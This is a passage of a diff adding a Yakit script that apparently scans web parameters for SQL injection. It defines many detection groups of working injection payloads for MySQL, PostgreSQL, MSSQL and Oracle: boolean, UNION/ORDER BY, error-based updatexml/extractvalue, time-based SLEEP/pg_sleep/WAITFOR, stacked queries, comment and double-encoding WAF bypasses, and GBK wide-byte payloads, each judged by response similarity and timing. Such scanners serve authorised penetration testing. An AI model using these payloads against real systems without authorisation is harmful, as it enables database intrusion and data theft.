+    params = freq.GetCommonParams()
+
+    // === 启用漏洞结果表格 ===
+    yakit.EnableTable("SQL注入测试流量", [
+        "序号",
+        "参数名",
+        "原始值",
+        "测试payload",
+        "完整测试值",
+        "检测组",
+        "请求URL",
+        "响应状态码",
+        "响应大小(bytes)",
+        "响应时间(ms)",
+        "相似度(与原始)",
+        "是否WAF拦截"
+    ])
+
+    tableLock = sync.NewLock()
+
+    // 表格行序号计数器（线程安全）
+    rowSeq := 0
+    seqLock := sync.NewLock()
+
+    // === 检测组定义 ===
+    detectionGroups = [
+        {
+            "name": "单引号连锁检测",
+            "type": "similarity",
+            "logic": "all",
+            "payloads": ["'", "''", "'''", "''''"],
+            "baseThreshold": 0.989,  // 使用第一个条件的阈值作为组默认值
+            "conditions": [
+                {
+                    "payload": "'",
+                    "compareWith": "original",
+                    "baseThreshold": 0.989,  // 使用原 threshold 值
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "''",
+                    "compareWith": "'",
+                    "baseThreshold": 0.99,  // 使用原 threshold 值
+                    "thresholdOperator": ">",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "'''",
+                    "compareWith": "''",
+                    "baseThreshold": 0.992,  // 使用原 threshold 值
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "通过单引号数量变化导致的连锁反应检测SQL注入"
+        },
+        {
+            "name": "布尔盲注 - AND条件对比",
+            "type": "boolean",
+            "logic": "all",
+            "payloads": [" and 1=1", " and 1=2"],
+            "baseThreshold": 0.98,  // 使用第一个条件的阈值
+            "conditions": [
+                {
+                    "payload": " and 1=1",
+                    "compareWith": "original",
+                    "baseThreshold": 0.98,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": " and 1=2",
+                    "compareWith": "original",
+                    "baseThreshold": 0.95,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "通过AND布尔条件对比检测SQL注入"
+        },
+        {
+            "name": "UNION注入渐进探测",
+            "type": "union",
+            "logic": "all",
+            "payloads": [
+                " union select null--",
+                " union select null,null--", 
+                " union select 1,2,3--",
+                " union all select 1,2,3--",
+                " order by 1--",
+                " order by 2--",
+                " order by 3--",
+                " order by 4--",
+                " order by 5--"
+            ],
+            "baseThreshold": 0.95,  // 使用多数条件的阈值
+            "conditions": [
+                {
+                    "payload": " order by 1--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.95,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": " order by 10--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.95,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": " union select null--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.98,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "通过UNION查询和ORDER BY渐进探测检测SQL注入"
+        },
+        {
+            "name": "报错注入检测",
+            "type": "error",
+            "logic": "any",
+            "payloads": [
+                "\"",
+                "'", 
+                "鎈'\"\\(",
+                "1' and updatexml(1,concat(0x7e,database(),0x7e),1)--",
+                "1' and extractvalue(1,concat(0x7e,database(),0x7e))--",
+                "1' and (select * from(select * from (select(1)))a)--",
+                "' and exp(~(select*from(select user())x))-- -",
+                "' and extractvalue(1,concat(0x7e,version())) -- ",
+                "'+AND+extractvalue(1,+concat(0x7e,+version()))+AND+'1'='1"
+            ],
+            "baseThreshold": 0.5,  // 所有条件阈值相同
+            "conditions": [
+                {
+                    "payload": "\"",
+                    "compareWith": "original",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "'",
+                    "compareWith": "original",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "鎈'\"\\(",
+                    "compareWith": "original",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "1' and updatexml(1,concat(0x7e,database(),0x7e),1)--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "1' and extractvalue(1,concat(0x7e,database(),0x7e))--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "1' and (select * from(select * from (select(1)))a)--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "' and exp(~(select*from(select user())x))-- -",
+                    "compareWith": "original",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "' and extractvalue(1,concat(0x7e,version())) -- ",
+                    "compareWith": "original",
+                    "baseThreshold": 0.90,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "'+AND+extractvalue(1,+concat(0x7e,+version()))+AND+'1'='1",
+                    "compareWith": "original",
+                    "baseThreshold": 0.90,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "通过引发数据库报错检测SQL注入"
+        },
+        {
+            "name": "MySQL时间盲注验证",
+            "type": "time",
+            "logic": "any",
+            "payloads": [
+                "' AND SLEEP(5)--",
+                "' AND SLEEP(5)--",
+                { "value": "id,(SELECT 1 FROM (SELECT(SLEEP(5)))a)", "mode": "replace" },
+                { "value": "id,(SELECT DATABASE())", "mode": "replace" },
+                "' OR SLEEP(5)--",
+                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                "' AND BENCHMARK(10000000,MD5(5))--",
+                "' or benchmark(100000,MD5(5))#",
+                "') or benchmark(100000,MD5(5))#",
+                "'%20and%20sleep(5)--%20-",
+                "'and/**/sleep(5)/**/and'"
+            ],
+            "baseThreshold": 0.1,  // 多数时间盲注使用0.1
+            "conditions": [
+                {
+                    "payload": "' AND SLEEP(5)--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "' AND SLEEP(5)--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "id,(SELECT 1 FROM (SELECT(SLEEP(5)))a)",
+                    "compareWith": "original",
+                    "baseThreshold": 0.01,  // 特殊固定值
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "' OR SLEEP(5)--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "' AND BENCHMARK(10000000,MD5(5))--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "' or benchmark(100000,MD5(5))#",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "') or benchmark(100000,MD5(5))#",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "'%20and%20sleep(5)--%20-",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "'and/**/sleep(5)/**/and'",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                }
+            ],
+            "description": "MySQL时间盲注检测（二次验证）"
+        },
+        {
+            "name": "PostgreSQL时间盲注",
+            "type": "time",
+            "logic": "any",
+            "payloads": [
+                "' AND pg_sleep(5)--",
+                "' AND pg_sleep(5)--",
+                "'/**/and(select'1'from/**/pg_sleep(5))::text>'0",
+                "'/**/and(select'1'from/**/pg_sleep(5))::text>'0"
+            ],
+            "baseThreshold": 0.1,
+            "conditions": [
+                {
+                    "payload": "' AND pg_sleep(5)--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "' AND pg_sleep(5)--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "'/**/and(select'1'from/**/pg_sleep(5))::text>'0",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "'/**/and(select'1'from/**/pg_sleep(5))::text>'0",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                }
+            ],
+            "description": "PostgreSQL时间盲注检测"
+        },
+        {
+            "name": "MSSQL时间盲注",
+            "type": "time",
+            "logic": "any",
+            "payloads": [
+                "'; WAITFOR DELAY '0:0:3'--",
+                "'; WAITFOR DELAY '0:0:5'--",
+                "' WAITFOR DELAY '0:0:3'--",
+                "' WAITFOR DELAY '0:0:5'--"
+            ],
+            "baseThreshold": 0.1,
+            "conditions": [
+                {
+                    "payload": "'; WAITFOR DELAY '0:0:3'--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "'; WAITFOR DELAY '0:0:5'--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "' WAITFOR DELAY '0:0:3'--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "' WAITFOR DELAY '0:0:5'--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                }
+            ],
+            "description": "MSSQL时间盲注检测"
+        },
+        {
+            "name": "Oracle时间盲注",
+            "type": "time",
+            "logic": "any",
+            "payloads": [
+                "' AND DBMS_PIPE.RECEIVE_MESSAGE('test',3)--",
+                "' AND DBMS_PIPE.RECEIVE_MESSAGE('test',5)--"
+            ],
+            "baseThreshold": 0.1,
+            "conditions": [
+                {
+                    "payload": "' AND DBMS_PIPE.RECEIVE_MESSAGE('test',3)--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "' AND DBMS_PIPE.RECEIVE_MESSAGE('test',5)--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                }
+            ],
+            "description": "Oracle时间盲注检测"
+        },
+        {
+            "name": "除零异常对比检测 (||)",
+            "type": "error",
+            "logic": "all",
+            "payloads": [
+                "'||1/1||'",
+                "'||1/0||'"
+            ],
+            "baseThreshold": 0.95,  // 使用第一个条件的阈值
+            "conditions": [
+                {
+                    "payload": "'||1/1||'",
+                    "compareWith": "original",
+                    "baseThreshold": 0.95,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "'||1/0||'",
+                    "compareWith": "original",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "通过字符串拼接中的除零异常检测SQL注入（适用于Oracle等支持||的数据库）"
+        },
+        {
+            "name": "除零异常对比检测 (AND)",
+            "type": "error",
+            "logic": "all",
+            "payloads": [
+                "' AND 1/1--",
+                "' AND 1/0--"
+            ],
+            "baseThreshold": 0.95,
+            "conditions": [
+                {
+                    "payload": "' AND 1/1--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.95,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "' AND 1/0--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "通过AND条件中的除零异常检测SQL注入（适用于MySQL、PostgreSQL等）"
+        },
+        {
+            "name": "注释符绕过检测 (/**/)",
+            "type": "boolean",
+            "logic": "all",
+            "payloads": [
+                "'/**/AND/**/1=1--",
+                "'/**/AND/**/1=2--"
+            ],
+            "baseThreshold": 0.95,
+            "conditions": [
+                {
+                    "payload": "'/**/AND/**/1=1--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.95,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "'/**/AND/**/1=2--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.9,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "通过/**/注释符绕过检测布尔盲注"
+        },
+        {
+            "name": "注释符绕过检测 (#)",
+            "type": "boolean",
+            "logic": "all",
+            "payloads": [
+                "'#AND 1=1",
+                "'#AND 1=2"
+            ],
+            "baseThreshold": 0.95,
+            "conditions": [
+                {
+                    "payload": "'#AND 1=1",
+                    "compareWith": "original",
+                    "baseThreshold": 0.95,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "'#AND 1=2",
+                    "compareWith": "original",
+                    "baseThreshold": 0.9,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "通过#注释符绕过检测布尔盲注"
+        },
+        {
+            "name": "注释符绕过检测 (--)",
+            "type": "boolean",
+            "logic": "all",
+            "payloads": [
+                "'-- AND 1=1",
+                "'-- AND 1=2"
+            ],
+            "baseThreshold": 0.95,
+            "conditions": [
+                {
+                    "payload": "'-- AND 1=1",
+                    "compareWith": "original",
+                    "baseThreshold": 0.95,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "'-- AND 1=2",
+                    "compareWith": "original",
+                    "baseThreshold": 0.9,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "通过--注释符绕过检测布尔盲注"
+        },
+        {
+            "name": "单引号原始响应对比",
+            "type": "similarity",
+            "logic": "all",
+            "payloads": ["'"],
+            "baseThreshold": 0.95,
+            "conditions": [
+                {
+                    "payload": "'",
+                    "compareWith": "original",
+                    "baseThreshold": 0.95,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "通过单引号与原始响应相似度对比检测SQL注入（简单单点检测）"
+        },
+        {
+            "name": "双引号连锁检测",
+            "type": "similarity",
+            "logic": "all",
+            "payloads": ["\"", "\"\"", "\"\"\"", "\"\"\"\""],
+            "baseThreshold": 0.989,
+            "conditions": [
+                {
+                    "payload": "\"",
+                    "compareWith": "original",
+                    "baseThreshold": 0.989,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "\"\"",
+                    "compareWith": "\"",
+                    "baseThreshold": 0.99,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "\"\"\"",
+                    "compareWith": "\"\"",
+                    "baseThreshold": 0.992,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "通过双引号数量变化导致的连锁反应检测SQL注入（双引号闭合）"
+        },
+        {
+            "name": "单引号括号闭合检测",
+            "type": "similarity",
+            "logic": "all",
+            "payloads": ["'", "')", "')--"],
+            "baseThreshold": 0.95,
+            "conditions": [
+                {
+                    "payload": "'",
+                    "compareWith": "original",
+                    "baseThreshold": 0.95,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "')",
+                    "compareWith": "original",
+                    "baseThreshold": 0.95,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "')--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.98,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "通过单引号与右括号组合探测是否存在括号包裹的SQL注入"
+        },
+        {
+            "name": "双引号括号闭合检测",
+            "type": "similarity",
+            "logic": "all",
+            "payloads": ["\"", "\")", "\")--"],
+            "baseThreshold": 0.95,
+            "conditions": [
+                {
+                    "payload": "\"",
+                    "compareWith": "original",
+                    "baseThreshold": 0.95,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "\")",
+                    "compareWith": "original",
+                    "baseThreshold": 0.95,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "\")--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.98,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "通过双引号与右括号组合探测是否存在括号包裹的SQL注入"
+        },
+        {
+            "name": "双重编码布尔盲注 (and 1=1 vs and 1=2)",
+            "type": "boolean",
+            "logic": "all",
+            "payloads": [
+                "%2527%2520%2561%256e%2564%2520%2531%253d%2531%2520%252d%252d%2520%252d",
+                "%2527%2520%2561%256e%2564%2520%2531%253d%2532%2520%252d%252d%2520%252d"
+            ],
+            "baseThreshold": 0.95,
+            "conditions": [
+                {
+                    "payload": "%2527%2520%2561%256e%2564%2520%2531%253d%2531%2520%252d%252d%2520%252d",
+                    "compareWith": "original",
+                    "baseThreshold": 0.95,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "%2527%2520%2561%256e%2564%2520%2531%253d%2532%2520%252d%252d%2520%252d",
+                    "compareWith": "original",
+                    "baseThreshold": 0.9,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "通过双重编码的 and 1=1 与 and 1=2 的页面差异检测 SQL 注入（高准确性）"
+        },
+        {
+            "name": "MySQL堆叠注入时间盲测",
+            "type": "time",
+            "logic": "any",
+            "payloads": [
+                "'; SELECT SLEEP(5)-- -",
+                "'; SELECT SLEEP(5)-- -",
+                "\"; SELECT SLEEP(5)-- -",
+                "'; select sleep(5)#",
+                "'; select sleep(5)--",
+                "'/*!50000;*/select sleep(5)-- -",
+                "';/*!50000select sleep(5)*/-- -",
+                "'; SELECT BENCHMARK(5000000, MD5('test'))-- -"
+            ],
+            "baseThreshold": 0.1,
+            "conditions": [
+                {
+                    "payload": "'; SELECT SLEEP(5)-- -",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "'; SELECT SLEEP(5)-- -",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "\"; SELECT SLEEP(5)-- -",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "'; select sleep(5)#",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "'; select sleep(5)--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "'/*!50000;*/select sleep(5)-- -",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "';/*!50000select sleep(5)*/-- -",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "'; SELECT BENCHMARK(5000000, MD5('test'))-- -",
+                    "compareWith": "original",
+                    "baseThreshold": 0.1,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                }
+            ],
+            "description": "检测 MySQL 堆叠注入：通过分号执行多条语句，利用 SLEEP 或 BENCHMARK 产生时间延迟"
+        },
+        {
+            "name": "PostgreSQL报错注入",
+            "type": "error",
+            "logic": "any",
+            "payloads": [
+                "' AND 1=CAST((SELECT version()) AS int)--",
+                "' AND 1=CAST((SELECT current_user) AS int)--",
+                "' AND 1=CAST((SELECT current_database()) AS int)--",
+                "' AND (SELECT 1/0 FROM pg_sleep(-1))--",
+                "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--"
+            ],
+            "baseThreshold": 0.5,
+            "conditions": [
+                {
+                    "payload": "' AND 1=CAST((SELECT version()) AS int)--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "' AND 1=CAST((SELECT current_user) AS int)--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "' AND (SELECT 1/0 FROM pg_sleep(-1))--",
+                    "compareWith": "original",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "PostgreSQL报错注入检测"
+        },
+        {
+            "name": "宽字节注入 - 基础探测",
+            "type": "similarity",
+            "logic": "any",
+            "payloads": ["%df%27"],
+            "conditions": [
+                {
+                    "payload": "%df%27",
+                    "compareWith": "original",
+                    "baseThreshold": 0.85,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "探测宽字节（GBK）是否成功闭合单引号，导致页面内容显著变化"
+        },
+        {
+            "name": "宽字节注入 - 布尔盲测",
+            "type": "boolean",
+            "logic": "all",
+            "payloads": [
+                "%df%27%20or%201=1%23",
+                "%df%27%20or%201=2%23"
+            ],
+            "conditions": [
+                {
+                    "payload": "%df%27%20or%201=1%23",
+                    "compareWith": "original",
+                    "baseThreshold": 0.98,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "%df%27%20or%201=2%23",
+                    "compareWith": "original",
+                    "baseThreshold": 0.75,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                },
+                {
+                    "payload": "%df%27%20or%201=1%23",
+                    "compareWith": "%df%27%20or%201=2%23",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 5000,
+                    "timeThresholdOperator": "<"
+                }
+            ],
+            "description": "宽字节注入布尔盲测：1=1与1=2页面差异明显，且与原始响应对比符合预期"
+        },
+        {
+            "name": "宽字节注入 - 时间盲测",
+            "type": "time",
+            "logic": "any",
+            "payloads": [
+                "%df%27%20and%20sleep(5)%23",
+                "%df%27%20and%20sleep(8)%23"
+            ],
+            "conditions": [
+                {
+                    "payload": "%df%27%20and%20sleep(5)%23",
+                    "compareWith": "original",
+                    "baseThreshold": -1.0,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4500,
+                    "timeThresholdOperator": ">"
+                },
+                {
+                    "payload": "%df%27%20and%20sleep(8)%23",
+                    "compareWith": "original",
+                    "baseThreshold": -1.0,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 7200,
+                    "timeThresholdOperator": ">"
+                }
+            ],
+            "description": "宽字节注入时间盲测，双延迟验证（忽略相似度，仅判断响应时间）"
+        }
+        
+    ]
+
+    // 新增：如果“仅测试额外字典”开关开启，则清空 detectionGroups（忽略任何潜在的内置组）
+    if onlyExtraDict {
+        detectionGroups = []
+        println("⚙️ 已启用「仅测试额外字典」模式，将忽略内置检测组，仅使用额外加载的检测组")
+    }
+
+    // ========== 处理临时 payload（支持多行或逗号分隔）==========
+    if tempPayloads != "" {
+        // 先按行分割
+        lines = str.ParseStringToLines(tempPayloads)
+        payloadList = []
+        for _, line = range lines {
+            line = str.TrimSpace(line)
+            if line == "" {
+                continue
+            }
+            // 如果某行中包含逗号，再按逗号分割（兼容旧格式）
+            if str.Contains(line, ",") {
+                parts = str.Split(line, ",")
+                for _, part = range parts {
+                    part = str.TrimSpace(part)
+                    if part != "" {
+                        payloadList = append(payloadList, part)
+                    }
+                }
+            } else {
+                payloadList = append(payloadList, line)
+            }
+        }
+        // 去重（可选）
+        uniqueMap = make(map[string]bool)
+        uniqueList = []
+        for _, pl = range payloadList {
+            if !uniqueMap[pl] {
+                uniqueMap[pl] = true
+                uniqueList = append(uniqueList, pl)
+            }
+        }
+        if len(uniqueList) > 0 {
+            finalPayloads = []
+            conditions = []
+            for _, pl = range uniqueList {
+                // append 模式（字符串）
+                finalPayloads = append(finalPayloads, pl)
+                // append 模式的两个条件：相似度 <0.5 或 时间 >4000ms
+                conditions = append(conditions, {
+                    "payload": pl,
+                    "compareWith": "original",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                })
+                conditions = append(conditions, {
+                    "payload": pl,
+                    "compareWith": "original",
+                    "baseThreshold": 0,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                })
+
+                // replace 模式（对象）
+                replacePayload = {"value": pl, "mode": "replace"}
+                finalPayloads = append(finalPayloads, replacePayload)
+                // replace 模式的两个条件
+                conditions = append(conditions, {
+                    "payload": pl,
+                    "compareWith": "original",
+                    "baseThreshold": 0.5,
+                    "thresholdOperator": "<",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                })
+                conditions = append(conditions, {
+                    "payload": pl,
+                    "compareWith": "original",
+                    "baseThreshold": 0,
+                    "thresholdOperator": ">",
+                    "timeThreshold": 4000,
+                    "timeThresholdOperator": ">"
+                })
+            }
+            tempGroup = {
+                "name": "临时 payload 测试",
+                "type": "any",
+                "logic": "any",
+                "payloads": finalPayloads,
+                "conditions": conditions,
+                "enableTimeCheck": true,   // 新增：强制启用时间检测
+                "description": "临时输入的 payload 自动生成的检测组（每个 payload 分别测试 append 和 replace 模式，任一 payload 触发相似度<0.5 或 响应时间>4000ms 即告警）"
+            }
+            detectionGroups = append(detectionGroups, tempGroup)
